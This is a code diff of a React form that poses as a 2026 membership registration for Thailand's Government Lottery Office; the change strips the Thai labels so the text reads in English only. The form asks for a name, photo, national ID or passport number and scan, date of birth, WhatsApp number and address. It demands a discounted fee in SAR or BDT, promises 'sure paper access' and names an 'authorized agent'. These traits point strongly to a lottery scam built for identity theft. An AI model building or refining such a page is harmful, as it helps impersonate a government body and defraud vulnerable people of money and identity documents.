@@ -27,18 +27,18 @@ export default function OnlineForm({ isStandalonePage = false }) {
 
   const days = Array.from({ length: 31 }, (_, i) => String(i + 1).padStart(2, '0'));
   const months = [
-    { value: '01', label: '01 - January (ม.ค.)' },
-    { value: '02', label: '02 - February (ก.พ.)' },
-    { value: '03', label: '03 - March (มี.ค.)' },
-    { value: '04', label: '04 - April (เม.ย.)' },
-    { value: '05', label: '05 - May (พ.ค.)' },
-    { value: '06', label: '06 - June (มิ.ย.)' },
-    { value: '07', label: '07 - July (ก.ค.)' },
-    { value: '08', label: '08 - August (ส.ค.)' },
-    { value: '09', label: '09 - September (ก.ย.)' },
-    { value: '10', label: '10 - October (ต.ค.)' },
-    { value: '11', label: '11 - November (พ.ย.)' },
-    { value: '12', label: '12 - December (ธ.ค.)' }
+    { value: '01', label: '01 - January' },
+    { value: '02', label: '02 - February' },
+    { value: '03', label: '03 - March' },
+    { value: '04', label: '04 - April' },
+    { value: '05', label: '05 - May' },
+    { value: '06', label: '06 - June' },
+    { value: '07', label: '07 - July' },
+    { value: '08', label: '08 - August' },
+    { value: '09', label: '09 - September' },
+    { value: '10', label: '10 - October' },
+    { value: '11', label: '11 - November' },
+    { value: '12', label: '12 - December' }
   ];
   const currentYear = new Date().getFullYear();
   const years = Array.from({ length: 70 }, (_, i) => String(currentYear - 16 - i));
@@ -95,32 +95,32 @@ export default function OnlineForm({ isStandalonePage = false }) {
   const handleSubmit = (e) => {
     e.preventDefault();
     if (!formData.name.trim()) {
-      alert('Please enter your Full Name (ชื่อ-นามสกุล).');
+      alert('Please enter your Full Name.');
       setActiveCard('name');
       return;
     }
     if (!photoFile) {
-      alert('Please upload your photograph (YOUR PHOTO HERE / กรุณาแนบรูปถ่ายที่นี่).');
+      alert('Please upload your photograph (YOUR PHOTO HERE).');
       setActiveCard('photo');
       return;
     }
     if (!formData.nidNumber.trim()) {
-      alert('Please enter your NID / Passport Number (เลขบัตรประจำตัวประชาชน).');
+      alert('Please enter your NID / Passport Number.');
       setActiveCard('nid');
       return;
     }
     if (!nidFile) {
-      alert('Please upload your NID or Passport document photo (NID PHOTO HERE / บัตรประชาชน).');
+      alert('Please upload your NID or Passport document photo (NID PHOTO HERE).');
       setActiveCard('nidPhoto');
       return;
     }
     if (!formData.phone.trim()) {
-      alert('Please enter your Contact Number (เบอร์โทรศัพท์ติดต่อ).');
+      alert('Please enter your Contact Number.');
       setActiveCard('phone');
       return;
     }
     if (!formData.address.trim()) {
-      alert('Please enter your Current Address (ที่อยู่ปัจจุบัน).');
+      alert('Please enter your Current Address.');
       setActiveCard('address');
       return;
     }
@@ -227,7 +227,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
                 </div>
                 <h2 className="gform-form-name">MEMBERSHIP REGISTRATION FORM 2026</h2>
                 <div className="gform-thai-tagline">
-                  แบบฟอร์มลงทะเบียนสมาชิกอย่างเป็นทางการ • สำนักงานสลากกินแบ่งรัฐบาล
+                  Official Member Registration Portal • Government Lottery Office (GLO)
                 </div>
                 <p className="gform-subtext">
                   Directly regulated by the Government Lottery Office (GLO), Bangkok, Thailand.
@@ -256,8 +256,8 @@ export default function OnlineForm({ isStandalonePage = false }) {
             </div>
 
             <div className="gform-notice-box">
-              <p>⚠️ กรุณากรอกข้อมูลที่ถูกต้องและตรงกับบัตรประชาชน • Please submit verified and accurate information.</p>
-              <span className="gform-required-note">* Indicates required question (ต้องระบุ)</span>
+              <p>⚠️ Please submit verified and accurate information matching your official documents.</p>
+              <span className="gform-required-note">* Indicates required question</span>
             </div>
           </div>
         </div>
@@ -269,49 +269,49 @@ export default function OnlineForm({ isStandalonePage = false }) {
             <div className="gform-success-body">
               <div className="gform-success-check-badge">✓</div>
               <h2 className="gform-success-title">Application Submitted Successfully!</h2>
-              <div className="gform-success-thai-title">บันทึกข้อมูลการสมัครสมาชิกเรียบร้อยแล้ว</div>
+              <div className="gform-success-thai-title">Your Membership Registration Has Been Recorded</div>
               <p className="gform-success-subtitle">
                 Your response has been recorded. Your application has been registered with the Government Lottery Office (GLO), Bangkok, Thailand under Senior Agent Md Fahim Chowdhury (TL-001).
               </p>
 
               <div className="gform-receipt-summary">
                 <div className="gform-receipt-header">
-                  <span>📄 Official Submission Receipt (ใบรับรองการลงทะเบียน)</span>
+                  <span>📄 Official Submission Receipt</span>
                   <span className="receipt-tag">STATUS: PENDING VERIFICATION</span>
                 </div>
                 <div className="gform-receipt-grid">
                   <div className="receipt-row">
-                    <span className="receipt-label">Full Name (ชื่อ-นามสกุล):</span>
+                    <span className="receipt-label">Full Name:</span>
                     <strong className="receipt-value">{formData.name}</strong>
                   </div>
                   <div className="receipt-row">
-                    <span className="receipt-label">NID Number (เลขบัตรประชาชน):</span>
+                    <span className="receipt-label">NID Number:</span>
                     <strong className="receipt-value">{formData.nidNumber}</strong>
                   </div>
                   <div className="receipt-row">
-                    <span className="receipt-label">Date of Birth (วัน/เดือน/ปีเกิด):</span>
+                    <span className="receipt-label">Date of Birth:</span>
                     <strong className="receipt-value">{formData.dobDay}/{formData.dobMonth}/{formData.dobYear}</strong>
                   </div>
                   <div className="receipt-row">
-                    <span className="receipt-label">Gender (เพศ):</span>
+                    <span className="receipt-label">Gender:</span>
                     <strong className="receipt-value">{formData.gender}</strong>
                   </div>
                   <div className="receipt-row">
-                    <span className="receipt-label">Contact Number (เบอร์โทรศัพท์):</span>
+                    <span className="receipt-label">Contact Number:</span>
                     <strong className="receipt-value">{formData.phone}</strong>
                   </div>
                   <div className="receipt-row">
-                    <span className="receipt-label">Current Address (ที่อยู่ปัจจุบัน):</span>
+                    <span className="receipt-label">Current Address:</span>
                     <strong className="receipt-value">{formData.address}</strong>
                   </div>
                   <div className="receipt-row">
-                    <span className="receipt-label">Country (ประเทศ):</span>
+                    <span className="receipt-label">Country:</span>
                     <strong className="receipt-value">
                       {formData.country === 'Other Country' ? formData.customCountry : formData.country}
                     </strong>
                   </div>
                   <div className="receipt-row">
-                    <span className="receipt-label">Applicant Photo (รูปถ่าย):</span>
+                    <span className="receipt-label">Applicant Photo:</span>
                     <strong className="receipt-value file-ok">✓ {photoFile ? photoFile.name : 'Uploaded'}</strong>
                   </div>
                   <div className="receipt-row">
@@ -319,7 +319,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
                     <strong className="receipt-value file-ok">✓ {nidFile ? nidFile.name : 'Uploaded'}</strong>
                   </div>
                   <div className="receipt-row">
-                    <span className="receipt-label">Authorized Agent (ตัวแทน):</span>
+                    <span className="receipt-label">Authorized Agent:</span>
                     <strong className="receipt-value">Md Fahim Chowdhury (TL-001)</strong>
                   </div>
                   <div className="receipt-row">
@@ -339,7 +339,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
                   className="button secondary gform-reset-btn"
                   onClick={resetForm}
                 >
-                  Submit another response (กรอกฟอร์มใหม่)
+                  Submit another response
                 </button>
               </div>
             </div>
@@ -351,23 +351,23 @@ export default function OnlineForm({ isStandalonePage = false }) {
               <div className="gform-section-banner-title">
                 <span className="gform-section-icon" aria-hidden="true">👤</span>
                 <span className="gform-section-text">
-                  PERSONAL INFORMATION • ข้อมูลส่วนตัว
+                  PERSONAL INFORMATION
                 </span>
               </div>
               <span className="gform-section-pill">CUSTOMER INFORMATION</span>
             </div>
 
-            {/* 1. Full Name (ชื่อ-นามสกุล) */}
+            {/* 1. Full Name */}
             <div
               className={`gform-question-card ${activeCard === 'name' ? 'is-active-card' : ''}`}
               onClick={() => setActiveCard('name')}
             >
               <div className="gform-card-left-indicator" aria-hidden="true" />
               <label className="gform-question-title" htmlFor="gform-name">
-                Full Name (ชื่อ-นามสกุล) <span className="gform-req">*</span>
+                Full Name <span className="gform-req">*</span>
               </label>
               <p className="gform-question-desc">
-                Enter your full official name as printed on your National ID or Passport (กรุณากรอกชื่อ-นามสกุลจริง)
+                Enter your full official name as printed on your National ID or Passport
               </p>
               <div className="gform-input-wrapper">
                 <input
@@ -376,7 +376,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
                   type="text"
                   required
                   className="gform-underline-input"
-                  placeholder="Your answer / กรอกคำตอบของคุณ"
+                  placeholder="Your answer"
                   value={formData.name}
                   onChange={handleChange}
                   onFocus={() => setActiveCard('name')}
@@ -385,14 +385,14 @@ export default function OnlineForm({ isStandalonePage = false }) {
               </div>
             </div>
 
-            {/* 2. Applicant Photo Upload (YOUR PHOTO HERE / กรุณาแนบรูปถ่ายที่นี่) */}
+            {/* 2. Applicant Photo Upload */}
             <div
               className={`gform-question-card ${activeCard === 'photo' ? 'is-active-card' : ''}`}
               onClick={() => setActiveCard('photo')}
             >
               <div className="gform-card-left-indicator" aria-hidden="true" />
               <div className="gform-question-title">
-                Applicant Photo (YOUR PHOTO HERE • กรุณาแนบรูปถ่ายที่นี่) <span className="gform-req">*</span>
+                Applicant Photo (YOUR PHOTO HERE) <span className="gform-req">*</span>
               </div>
               <p className="gform-question-desc">
                 Upload 1 recent clear passport-size photograph (JPG, PNG — Max 10MB)
@@ -426,7 +426,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
                         d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"
                       />
                     </svg>
-                    <span>Add file (แนบรูปถ่าย JPG / PNG)</span>
+                    <span>Add file (JPG / PNG)</span>
                   </label>
                   <input
                     id="gform-photo-input"
@@ -445,17 +445,17 @@ export default function OnlineForm({ isStandalonePage = false }) {
               )}
             </div>
 
-            {/* 3. NID Number (เลขบัตรประจำตัวประชาชน) */}
+            {/* 3. NID Number */}
             <div
               className={`gform-question-card ${activeCard === 'nid' ? 'is-active-card' : ''}`}
               onClick={() => setActiveCard('nid')}
             >
               <div className="gform-card-left-indicator" aria-hidden="true" />
               <label className="gform-question-title" htmlFor="gform-nid-number">
-                NID Number (เลขบัตรประจำตัวประชาชน / พาสปอร์ต) <span className="gform-req">*</span>
+                NID / Passport Number <span className="gform-req">*</span>
               </label>
               <p className="gform-question-desc">
-                Enter your National ID, Iqama, or Passport number (กรุณากรอกเลขบัตรประชาชนหรือหนังสือเดินทาง)
+                Enter your National ID, Iqama, or Passport number
               </p>
               <div className="gform-input-wrapper">
                 <input
@@ -473,14 +473,14 @@ export default function OnlineForm({ isStandalonePage = false }) {
               </div>
             </div>
 
-            {/* 4. NID Photo Upload (NID PHOTO HERE • บัตรประชาชน) */}
+            {/* 4. NID Photo Upload */}
             <div
               className={`gform-question-card ${activeCard === 'nidPhoto' ? 'is-active-card' : ''}`}
               onClick={() => setActiveCard('nidPhoto')}
             >
               <div className="gform-card-left-indicator" aria-hidden="true" />
               <div className="gform-question-title">
-                NID / Passport Document Photo (NID PHOTO HERE • บัตรประชาชน) <span className="gform-req">*</span>
+                NID / Passport Document Photo (NID PHOTO HERE) <span className="gform-req">*</span>
               </div>
               <p className="gform-question-desc">
                 Upload a clear photo or scanned copy of your NID Card front page or Passport (JPG / PNG / PDF — Max 10MB)
@@ -517,7 +517,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
                         d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"
                       />
                     </svg>
-                    <span>📷 NID PHOTO HERE (แนบรูปถ่ายบัตรประชาชน JPG / PNG)</span>
+                    <span>📷 NID PHOTO HERE (Upload JPG / PNG)</span>
                   </label>
                   <input
                     id="gform-nid-input"
@@ -532,22 +532,22 @@ export default function OnlineForm({ isStandalonePage = false }) {
               )}
             </div>
 
-            {/* 5. Date of Birth (วัน/เดือน/ปีเกิด) */}
+            {/* 5. Date of Birth */}
             <div
               className={`gform-question-card ${activeCard === 'dob' ? 'is-active-card' : ''}`}
               onClick={() => setActiveCard('dob')}
             >
               <div className="gform-card-left-indicator" aria-hidden="true" />
               <label className="gform-question-title">
-                Date of Birth (วัน/เดือน/ปีเกิด) <span className="gform-req">*</span>
+                Date of Birth <span className="gform-req">*</span>
               </label>
               <p className="gform-question-desc">
-                Select your Day, Month and Year of birth (วัน/เดือน/ปีเกิดตามเอกสารราชการ)
+                Select your Day, Month and Year of birth according to official documents
               </p>
 
               <div className="gform-dob-grid">
                 <div className="gform-select-wrapper gform-dob-col">
-                  <span className="gform-dob-label">DD / วัน</span>
+                  <span className="gform-dob-label">DD</span>
                   <select
                     name="dobDay"
                     value={formData.dobDay}
@@ -565,7 +565,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
                 </div>
 
                 <div className="gform-select-wrapper gform-dob-col">
-                  <span className="gform-dob-label">MM / เดือน</span>
+                  <span className="gform-dob-label">MM</span>
                   <select
                     name="dobMonth"
                     value={formData.dobMonth}
@@ -583,7 +583,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
                 </div>
 
                 <div className="gform-select-wrapper gform-dob-col">
-                  <span className="gform-dob-label">YYYY / ปี</span>
+                  <span className="gform-dob-label">YYYY</span>
                   <select
                     name="dobYear"
                     value={formData.dobYear}
@@ -602,22 +602,22 @@ export default function OnlineForm({ isStandalonePage = false }) {
               </div>
             </div>
 
-            {/* 6. Gender (เพศ) */}
+            {/* 6. Gender */}
             <div
               className={`gform-question-card ${activeCard === 'gender' ? 'is-active-card' : ''}`}
               onClick={() => setActiveCard('gender')}
             >
               <div className="gform-card-left-indicator" aria-hidden="true" />
               <div className="gform-question-title">
-                Gender (เพศ) <span className="gform-req">*</span>
+                Gender <span className="gform-req">*</span>
               </div>
-              <p className="gform-question-desc">Select your official gender (เลือกเพศของคุณ)</p>
+              <p className="gform-question-desc">Select your official gender</p>
 
               <div className="gform-radio-group gform-gender-radio-group">
                 {[
-                  { id: 'Male', label: 'Male (ชาย)' },
-                  { id: 'Female', label: 'Female (หญิง)' },
-                  { id: 'Other', label: 'Other (อื่นๆ)' }
+                  { id: 'Male', label: 'Male' },
+                  { id: 'Female', label: 'Female' },
+                  { id: 'Other', label: 'Other' }
                 ].map((g) => (
                   <label
                     key={g.id}
@@ -641,14 +641,14 @@ export default function OnlineForm({ isStandalonePage = false }) {
               </div>
             </div>
 
-            {/* 7. Contact Number (เบอร์โทรศัพท์ติดต่อ) */}
+            {/* 7. Contact Number */}
             <div
               className={`gform-question-card ${activeCard === 'phone' ? 'is-active-card' : ''}`}
               onClick={() => setActiveCard('phone')}
             >
               <div className="gform-card-left-indicator" aria-hidden="true" />
               <label className="gform-question-title" htmlFor="gform-phone">
-                Contact Number (เบอร์โทรศัพท์ติดต่อ / WhatsApp) <span className="gform-req">*</span>
+                Contact Number (WhatsApp) <span className="gform-req">*</span>
               </label>
               <p className="gform-question-desc">
                 Your official membership credentials, sure paper access, and VIP updates will be sent to this number
@@ -669,14 +669,14 @@ export default function OnlineForm({ isStandalonePage = false }) {
               </div>
             </div>
 
-            {/* 7. Current Address (ที่อยู่ปัจจุบัน) */}
+            {/* 8. Current Address */}
             <div
               className={`gform-question-card ${activeCard === 'address' ? 'is-active-card' : ''}`}
               onClick={() => setActiveCard('address')}
             >
               <div className="gform-card-left-indicator" aria-hidden="true" />
               <label className="gform-question-title" htmlFor="gform-address">
-                Current Address (ที่อยู่ปัจจุบัน) <span className="gform-req">*</span>
+                Current Address <span className="gform-req">*</span>
               </label>
               <p className="gform-question-desc">
                 Enter your present living street, village, district, or city address
@@ -697,14 +697,14 @@ export default function OnlineForm({ isStandalonePage = false }) {
               </div>
             </div>
 
-            {/* 10. Country of Residence (ประเทศ) */}
+            {/* 9. Country of Residence */}
             <div
               className={`gform-question-card ${activeCard === 'country' ? 'is-active-card' : ''}`}
               onClick={() => setActiveCard('country')}
             >
               <div className="gform-card-left-indicator" aria-hidden="true" />
               <label className="gform-question-title" htmlFor="gform-country">
-                Country of Residence (ประเทศที่พำนัก) <span className="gform-req">*</span>
+                Country of Residence <span className="gform-req">*</span>
               </label>
               <p className="gform-question-desc">Select the country where you are currently living or working</p>
               <div className="gform-select-wrapper">
@@ -747,7 +747,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
               <div className="gform-section-banner-title">
                 <span className="gform-section-icon" aria-hidden="true">💳</span>
                 <span className="gform-section-text">
-                  MEMBERSHIP FEE • ค่าธรรมเนียมสมาชิก
+                  MEMBERSHIP FEE & QUOTA
                 </span>
               </div>
               <span className="gform-section-pill">SPECIAL DISCOUNT OFFER</span>
@@ -759,7 +759,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
               <div className="gform-pricing-grid">
                 {/* Original Price */}
                 <div className="gform-price-box gform-price-original">
-                  <span className="gform-price-label">Original Price (ราคาปกติ)</span>
+                  <span className="gform-price-label">Original Price</span>
                   <div className="gform-price-num-struck">
                     <span className="gform-struck-line">1250 SAR</span>
                     <span className="gform-price-sub">(35,000 BDT)</span>
@@ -774,7 +774,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
                     <span className="gform-price-loud">250 SAR</span>
                     <span className="gform-price-bdt">(২,৫০০ টাকা / BDT)</span>
                   </div>
-                  <span className="gform-limited-badge">⚡ Limited Time Offer (เวลาจำกัด)</span>
+                  <span className="gform-limited-badge">⚡ Limited Time Offer</span>
                 </div>
 
                 {/* Saudi & International Arabic Tag */}
@@ -791,7 +791,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
               <div className="gform-section-banner-title">
                 <span className="gform-section-icon" aria-hidden="true">🏛️</span>
                 <span className="gform-section-text">
-                  AGENT INFORMATION (ข้อมูลตัวแทนอย่างเป็นทางการ)
+                  AGENT INFORMATION
                 </span>
               </div>
               <span className="gform-section-pill">OFFICIAL VERIFIED AGENT</span>
@@ -803,23 +803,23 @@ export default function OnlineForm({ isStandalonePage = false }) {
               <div className="gform-agent-layout">
                 <div className="gform-agent-meta">
                   <div className="gform-agent-field">
-                    <span className="gform-agent-label">Agent Name (ชื่อ-นามสกุล):</span>
+                    <span className="gform-agent-label">Agent Name:</span>
                     <strong className="gform-agent-name-highlight">মোঃ ফাহিম চৌধুরী (Md Fahim Chowdhury)</strong>
                   </div>
                   <div className="gform-agent-field">
-                    <span className="gform-agent-label">Agent ID (รหัสเอเยนต์):</span>
+                    <span className="gform-agent-label">Agent ID:</span>
                     <span className="gform-agent-id-badge">TL - 001</span>
                   </div>
                   <span className="gform-agent-subtext">Senior Authorized GLO Membership Officer</span>
                 </div>
 
                 <div className="gform-agent-documents-box">
-                  <span className="gform-docs-title">OFFICIAL DOCUMENTS (เอกสารที่ใช้ยืนยัน)</span>
+                  <span className="gform-docs-title">OFFICIAL DOCUMENTS</span>
                   <ul className="gform-docs-list">
-                    <li>🪪 NID Copy (สำเนาบัตรประชาชน)</li>
-                    <li>🛂 Passport Copy (สำเนาหนังสือเดินทาง)</li>
-                    <li>🏠 Proof of Address (หลักฐานที่อยู่)</li>
-                    <li>🤳 Selfie with ID (เซลฟี่คู่กับบัตรประชาชน)</li>
+                    <li>🪪 NID Copy</li>
+                    <li>🛂 Passport Copy</li>
+                    <li>🏠 Proof of Address</li>
+                    <li>🤳 Selfie with ID</li>
                   </ul>
                 </div>
 
@@ -928,7 +928,7 @@ export default function OnlineForm({ isStandalonePage = false }) {
                     Submitting Application...
                   </span>
                 ) : (
-                  <span>Submit Application & Confirm Membership (ส่งใบสมัคร)</span>
+                  <span>Submit Application & Confirm Membership</span>
                 )}
               </button>
               <div className="gform-security-footer-note">
